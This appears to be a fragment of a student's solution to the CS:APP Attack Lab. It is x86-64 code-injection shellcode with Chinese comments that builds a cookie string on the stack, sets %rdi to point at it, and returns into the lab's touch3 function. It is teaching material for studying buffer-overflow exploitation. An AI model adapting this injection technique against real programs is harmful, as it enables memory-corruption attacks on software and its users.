subq    $0x40,%rsp              # 避免覆盖 injected code 本身的存储区域！
movl    $0x4018fa,0x38(%rsp)    # touch3 的起始地址
movl    $0x39623935,0x4(%rsp)   # 存储 cookie 的字符串的前四字节。刚好在 s_tail 之后。
movl    $0x61663739,0x8(%rsp)   # 存储 cookie 的字符串的后四字节。利用movl指令将高四个字节置0的性质，完成字符串末尾0的设置。
leaq    0x4(%rsp),%rdi          # 设置 touch3 的参数 sval 指向 cookie 的字符串表示
addq    $0x38,%rsp
retq                            # 弹出 touch3 的起始地址赋值给 PC
